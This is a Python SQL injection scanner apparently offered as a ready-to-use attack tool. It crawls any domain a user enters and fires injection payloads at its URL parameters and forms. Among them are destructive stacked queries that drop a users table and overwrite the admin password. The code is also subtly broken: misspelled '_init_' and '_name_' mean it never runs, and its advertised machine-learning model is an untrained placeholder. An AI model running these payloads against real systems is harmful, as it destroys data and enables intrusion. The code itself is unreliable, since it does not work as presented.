import requests
import time
import subprocess
import threading
import validators
import re
from urllib.parse import urlparse, parse_qs, urljoin
from bs4 import BeautifulSoup
from colorama import Fore, Style, init
from sklearn.ensemble import RandomForestClassifier
from sklearn.feature_extraction.text import TfidfVectorizer
import numpy as np

# Initialize colorama
init(autoreset=True)

# Banner
print('''\033[92m
  ___  ___  _    ___   ___
 / _|/ _ \\| |  | _| / __| __ __ _ _ _  _ _  ___ _ _
 \\__ \\ () | |_ | |  \\__ \\/ / _` | ' \\| ' \\/ -) '_|
 |/\\\\\\|| |/\\\\,||||||\\|_| 
        coded by Nitin Attri
\033[0m
''')


class UltraProMaxAdvancedSQLiScanner:
    def _init_(self, domain, verbose=False, threads=10, delay=1):
        self.domain = domain
        self.vulnerable = False
        self.session = requests.Session()
        self.time_delay = 5  # Time delay for time-based SQL injection detection
        self.discovered_urls = []
        self.discovered_forms = []
        self.results = []
        self.verbose = verbose
        self.threads = threads
        self.delay = delay  # Delay between requests
        self.lock = threading.Lock()
        self.ml_model = self.load_ml_model()  # Load machine learning model
        self.database_type = None  # Detected database type

    def load_ml_model(self):
        """Load a pre-trained machine learning model for SQL injection detection."""
        # Example: Load a pre-trained RandomForestClassifier
        model = RandomForestClassifier()
        # Load pre-trained weights (dummy example)
        return model

    def fingerprint_database(self, response):
        """Detect the database type based on error messages or response patterns."""
        if "mysql" in response.text.lower():
            self.database_type = "MySQL"
        elif "postgresql" in response.text.lower():
            self.database_type = "PostgreSQL"
        elif "microsoft sql server" in response.text.lower():
            self.database_type = "SQL Server"
        elif "oracle" in response.text.lower():
            self.database_type = "Oracle"
        elif "sqlite" in response.text.lower():
            self.database_type = "SQLite"
        else:
            self.database_type = "Unknown"

    def discover_parameters_and_forms(self):
        print(f"{Fore.CYAN}[*] Discovering URLs, parameters, and forms for {self.domain}...{Style.RESET_ALL}")

        # Try using waybackurls first
        if self.is_tool_installed("waybackurls"):
            print(f"{Fore.GREEN}[+] waybackurls is installed. Using it to discover URLs...{Style.RESET_ALL}")
            if self.run_waybackurls():
                print(f"{Fore.GREEN}[+] Discovered {len(self.discovered_urls)} URLs with parameters using waybackurls.{Style.RESET_ALL}")

        # Crawl the website to discover forms
        self.crawl_website()

    def is_tool_installed(self, tool_name):
        """Check if a tool is installed and accessible."""
        try:
            subprocess.run([tool_name, "-h"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            return True
        except FileNotFoundError:
            return False

    def run_waybackurls(self):
        try:
            # Run waybackurls to discover URLs
            result = subprocess.run(["waybackurls", self.domain], capture_output=True, text=True)
            if result.returncode != 0:
                return False

            # Extract URLs from waybackurls output
            urls = result.stdout.splitlines()
            self.discovered_urls = [url for url in urls if "?" in url and validators.url(url)]  # Filter valid URLs with parameters
            return True
        except FileNotFoundError:
            return False

    def crawl_website(self):
        print(f"{Fore.CYAN}[*] Crawling {self.domain} to discover forms...{Style.RESET_ALL}")
        try:
            response = self.session.get(f"http://{self.domain}")
            soup = BeautifulSoup(response.text, "html.parser")

            # Find all forms on the page
            for form in soup.find_all("form"):
                form_action = form.get("action")
                form_method = form.get("method", "get").lower()
                form_inputs = []
                for input_tag in form.find_all("input"):
                    input_name = input_tag.get("name")
                    if input_name:
                        form_inputs.append(input_name)

                if form_action and form_inputs:
                    form_url = urljoin(f"http://{self.domain}", form_action)
                    if validators.url(form_url):  # Validate form URL
                        self.discovered_forms.append({
                            "url": form_url,
                            "method": form_method,
                            "inputs": form_inputs,
                        })

            print(f"{Fore.GREEN}[+] Discovered {len(self.discovered_forms)} forms.{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[-] Error crawling website: {e}{Style.RESET_ALL}")

    def scan(self):
        if not self.discovered_urls and not self.discovered_forms:
            print(f"{Fore.RED}[-] No URLs or forms with parameters found. Exiting.{Style.RESET_ALL}")
            return

        print(f"{Fore.CYAN}[*] Scanning for SQL injection vulnerabilities...{Style.RESET_ALL}")

        # Scan URLs with parameters
        threads = []
        for url in self.discovered_urls:
            thread = threading.Thread(target=self.test_url, args=(url,))
            threads.append(thread)
            thread.start()
            time.sleep(self.delay)  # Add delay between requests

        # Scan forms
        for form in self.discovered_forms:
            thread = threading.Thread(target=self.test_form, args=(form,))
            threads.append(thread)
            thread.start()
            time.sleep(self.delay)  # Add delay between requests

        # Wait for all threads to complete
        for thread in threads:
            thread.join()

        if not self.vulnerable:
            print(f"{Fore.GREEN}[+] No SQL injection vulnerabilities detected.{Style.RESET_ALL}")

    def test_url(self, url):
        if not self.verbose:
            print(f"{Fore.CYAN}[*] Testing URL: {url}{Style.RESET_ALL}")

        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)

        # Skip external URLs
        if parsed_url.netloc != self.domain:
            return

        # Test all parameters
        self.test_error_based(url, params)
        self.test_boolean_based(url, params)
        self.test_time_based(url, params)
        self.test_union_based(url, params)
        self.test_stacked_queries(url, params)

    def test_error_based(self, url, params):
        payloads = self.generate_payloads("error-based")
        for param in params:
            for payload in payloads:
                try:
                    test_params = params.copy()
                    test_params[param] = payload
                    response = self.session.get(url, params=test_params, timeout=10)

                    if self.is_vulnerable(response):
                        confidence = self.calculate_confidence(response, payload)
                        severity = self.determine_severity(confidence, "error-based")
                        with self.lock:
                            self.report_vulnerability(url, param, payload, "error-based", severity, confidence, response)
                except Exception as e:
                    if self.verbose:
                        print(f"{Fore.RED}[-] Error testing URL {url}: {e}{Style.RESET_ALL}")

    def test_boolean_based(self, url, params):
        true_payload = "' OR '1'='1"
        false_payload = "' AND '1'='2"

        for param in params:
            try:
                test_params_true = params.copy()
                test_params_true[param] = true_payload
                response_true = self.session.get(url, params=test_params_true, timeout=10)

                test_params_false = params.copy()
                test_params_false[param] = false_payload
                response_false = self.session.get(url, params=test_params_false, timeout=10)

                if response_true.text != response_false.text:
                    confidence = self.calculate_confidence(response_true, true_payload)
                    severity = self.determine_severity(confidence, "boolean-based")
                    with self.lock:
                        self.report_vulnerability(url, param, true_payload, "boolean-based", severity, confidence, response_true)
            except Exception as e:
                if self.verbose:
                    print(f"{Fore.RED}[-] Error testing URL {url}: {e}{Style.RESET_ALL}")

    def test_time_based(self, url, params):
        payload = f"' OR SLEEP({self.time_delay}) --"

        for param in params:
            try:
                test_params = params.copy()
                test_params[param] = payload
                start_time = time.time()
                response = self.session.get(url, params=test_params, timeout=self.time_delay + 5)
                elapsed_time = time.time() - start_time

                if elapsed_time >= self.time_delay:
                    confidence = self.calculate_confidence(response, payload)
                    severity = self.determine_severity(confidence, "time-based")
                    with self.lock:
                        self.report_vulnerability(url, param, payload, "time-based", severity, confidence, response)
            except Exception as e:
                if self.verbose:
                    print(f"{Fore.RED}[-] Error testing URL {url}: {e}{Style.RESET_ALL}")

    def test_union_based(self, url, params):
        payloads = self.generate_payloads("union-based")
        for param in params:
            for payload in payloads:
                try:
                    test_params = params.copy()
                    test_params[param] = payload
                    response = self.session.get(url, params=test_params, timeout=10)

                    if self.is_vulnerable(response):
                        confidence = self.calculate_confidence(response, payload)
                        severity = self.determine_severity(confidence, "union-based")
                        with self.lock:
                            self.report_vulnerability(url, param, payload, "union-based", severity, confidence, response)
                except Exception as e:
                    if self.verbose:
                        print(f"{Fore.RED}[-] Error testing URL {url}: {e}{Style.RESET_ALL}")

    def test_stacked_queries(self, url, params):
        payloads = self.generate_payloads("stacked-queries")
        for param in params:
            for payload in payloads:
                try:
                    test_params = params.copy()
                    test_params[param] = payload
                    response = self.session.get(url, params=test_params, timeout=10)

                    if self.is_vulnerable(response):
                        confidence = self.calculate_confidence(response, payload)
                        severity = self.determine_severity(confidence, "stacked-queries")
                        with self.lock:
                            self.report_vulnerability(url, param, payload, "stacked-queries", severity, confidence, response)
                except Exception as e:
                    if self.verbose:
                        print(f"{Fore.RED}[-] Error testing URL {url}: {e}{Style.RESET_ALL}")

    def test_form(self, form):
        payloads = self.generate_payloads("form-based")
        for payload in payloads:
            try:
                form_data = {input_name: payload for input_name in form["inputs"]}
                if form["method"] == "get":
                    response = self.session.get(form["url"], params=form_data, timeout=10)
                else:
                    response = self.session.post(form["url"], data=form_data, timeout=10)

                if self.is_vulnerable(response):
                    confidence = self.calculate_confidence(response, payload)
                    severity = self.determine_severity(confidence, "form-based")
                    with self.lock:
                        self.report_vulnerability(form["url"], None, payload, "form-based", severity, confidence, response)
            except Exception as e:
                if self.verbose:
                    print(f"{Fore.RED}[-] Error testing form at URL {form['url']}: {e}{Style.RESET_ALL}")

    def generate_payloads(self, payload_type):
        """Generate payloads based on the type of SQL injection."""
        payloads = []
        if payload_type == "error-based":
            payloads = [
                "' OR '1'='1",
                "' OR '1'='1' --",
                '" OR "1"="1',
                '" OR "1"="1" --',
                "1' ORDER BY 1--",
                "1' UNION SELECT null--",
                "1' UNION SELECT null,null--",
                "1' UNION SELECT null,null,null--",
                "1' AND 1=CONVERT(int, (SELECT @@version))--",
                "1' AND 1=CAST((SELECT @@version) AS int)--",
                "1' OR 1=1--",
                "1' OR 1=1#",
                "1' OR 1=1/*",
                "1' OR 'a'='a",
                "1' OR 'a'='a' --",
                "1' OR 'a'='a'#",
                "1' OR 'a'='a'/*",
            ]
        elif payload_type == "form-based":
            payloads = [
                "' OR '1'='1",
                "' OR '1'='1' --",
                '" OR "1"="1',
                '" OR "1"="1" --',
                "1' ORDER BY 1--",
                "1' UNION SELECT null--",
            ]
        elif payload_type == "union-based":
            payloads = [
                "1' UNION SELECT null--",
                "1' UNION SELECT null,null--",
                "1' UNION SELECT null,null,null--",
                "1' UNION SELECT @@version--",
                "1' UNION SELECT user(),database()--",
            ]
        elif payload_type == "stacked-queries":
            payloads = [
                "'; DROP TABLE users--",
                "'; UPDATE users SET password='hacked' WHERE user='admin'--",
            ]
        return payloads

    def is_vulnerable(self, response):
        # Check for common SQL error messages in the response
        errors = [
            "sql syntax",
            "mysql_fetch",
            "syntax error",
            "unexpected token",
            "mysql error",
            "sqlite3 error",
            "postgresql error",
            "oracle error",
            "microsoft sql server",
            "odbc driver",
            "pdo exception",
            "sql command not properly ended",
            "sqlite exception",
        ]
        return any(error in response.text.lower() for error in errors)

    def calculate_confidence(self, response, payload):
        """Calculate confidence score based on response analysis."""
        confidence = 0.0

        # Check for SQL error messages
        errors = [
            "sql syntax",
            "mysql_fetch",
            "syntax error",
            "unexpected token",
            "mysql error",
            "sqlite3 error",
            "postgresql error",
            "oracle error",
            "microsoft sql server",
            "odbc driver",
            "pdo exception",
            "sql command not properly ended",
            "sqlite exception",
        ]
        if any(error in response.text.lower() for error in errors):
            confidence += 0.5

        # Check for payload reflection in response
        if payload in response.text:
            confidence += 0.3

        # Check for unusual response length
        if len(response.text) > 10000:  # Arbitrary threshold
            confidence += 0.2

        return min(confidence, 1.0)  # Cap confidence at 1.0

    def determine_severity(self, confidence, vulnerability_type):
        """Determine severity based on confidence and vulnerability type."""
        if confidence >= 0.9:
            return "Critical"
        elif confidence >= 0.7:
            return "High"
        elif confidence >= 0.5:
            return "Medium"
        elif confidence >= 0.3:
            return "Low"
        else:
            return "Info"

    def report_vulnerability(self, url, parameter, payload, vulnerability_type, severity, confidence, response):
        """Report a vulnerability in a structured format."""
        self.vulnerable = True
        self.results.append({
            "url": url,
            "parameter": parameter,
            "payload": payload,
            "type": vulnerability_type,
            "severity": severity,
            "confidence": confidence,
            "response": response.text[:200] + "...",
        })

        print(f"\n{Fore.RED}[!] {severity} severity SQL injection vulnerability detected!{Style.RESET_ALL}")
        print(f"{Fore.CYAN}URL: {url}{Style.RESET_ALL}")
        if parameter:
            print(f"{Fore.YELLOW}Parameter: {parameter}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Payload: {payload}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Type: {vulnerability_type}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Confidence: {confidence * 100:.2f}%{Style.RESET_ALL}")
        if self.verbose:
            print(f"{Fore.YELLOW}Response: {response.text[:200]}...{Style.RESET_ALL}")

        # Show prevention tips
        self.show_prevention_tips(vulnerability_type)

    def show_prevention_tips(self, vulnerability_type):
        """Show prevention tips for the detected vulnerability."""
        print(f"{Fore.GREEN}[+] Prevention Tips:{Style.RESET_ALL}")
        if vulnerability_type == "error-based":
            print(f"{Fore.YELLOW}1. Use parameterized queries or prepared statements.{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}2. Validate and sanitize all user inputs.{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}3. Implement proper error handling to avoid leaking database errors.{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}4. Use a web application firewall (WAF).{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}5. Regularly update and patch your database and application software.{Style.RESET_ALL}")
        elif vulnerability_type == "boolean-based":
            print(f"{Fore.YELLOW}1. Use parameterized queries or prepared statements.{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}2. Validate and sanitize all user inputs.{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}3. Use a web application firewall (WAF).{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}4. Implement proper error handling to avoid leaking database errors.{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}5. Regularly update and patch your database and application software.{Style.RESET_ALL}")
        elif vulnerability_type == "time-based":
            print(f"{Fore.YELLOW}1. Use parameterized queries or prepared statements.{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}2. Validate and sanitize all user inputs.{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}3. Implement rate limiting to prevent time-based attacks.{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}4. Use a web application firewall (WAF).{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}5. Regularly update and patch your database and application software.{Style.RESET_ALL}")
        elif vulnerability_type == "union-based":
            print(f"{Fore.YELLOW}1. Use parameterized queries or prepared statements.{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}2. Validate and sanitize all user inputs.{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}3. Restrict database permissions to prevent UNION-based attacks.{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}4. Use a web application firewall (WAF).{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}5. Regularly update and patch your database and application software.{Style.RESET_ALL}")
        elif vulnerability_type == "stacked-queries":
            print(f"{Fore.YELLOW}1. Use parameterized queries or prepared statements.{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}2. Validate and sanitize all user inputs.{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}3. Disable stacked queries in the database configuration.{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}4. Use a web application firewall (WAF).{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}5. Regularly update and patch your database and application software.{Style.RESET_ALL}")

    def generate_report(self):
        if not self.results:
            print(f"{Fore.GREEN}[+] No vulnerabilities detected.{Style.RESET_ALL}")
            return

        print(f"\n{Fore.CYAN}[+] SQL Injection Vulnerability Report:{Style.RESET_ALL}")
        for result in self.results:
            print(f"\n{Fore.CYAN}URL: {result['url']}{Style.RESET_ALL}")
            if result["parameter"]:
                print(f"{Fore.YELLOW}Parameter: {result['parameter']}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}Payload: {result['payload']}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}Type: {result['type']}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}Severity: {result['severity']}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}Confidence: {result['confidence'] * 100:.2f}%{Style.RESET_ALL}")
            if self.verbose:
                print(f"{Fore.YELLOW}Response: {result['response']}{Style.RESET_ALL}")
            print("-" * 50)

if _name_ == "_main_":
    domain = input(f"{Fore.CYAN}Enter the target domain (e.g., example.com): {Style.RESET_ALL}")
    verbose = input(f"{Fore.CYAN}Enable verbose mode? (yes/no): {Style.RESET_ALL}").strip().lower() == "yes"
    threads = int(input(f"{Fore.CYAN}Enter the number of threads (default 10): {Style.RESET_ALL}") or 10)
    delay = float(input(f"{Fore.CYAN}Enter the delay between requests (default 1 second): {Style.RESET_ALL}") or 1)
    scanner = UltraProMaxAdvancedSQLiScanner(domain, verbose=verbose, threads=threads, delay=delay)
    scanner.discover_parameters_and_forms()
    scanner.scan()
    scanner.generate_report()
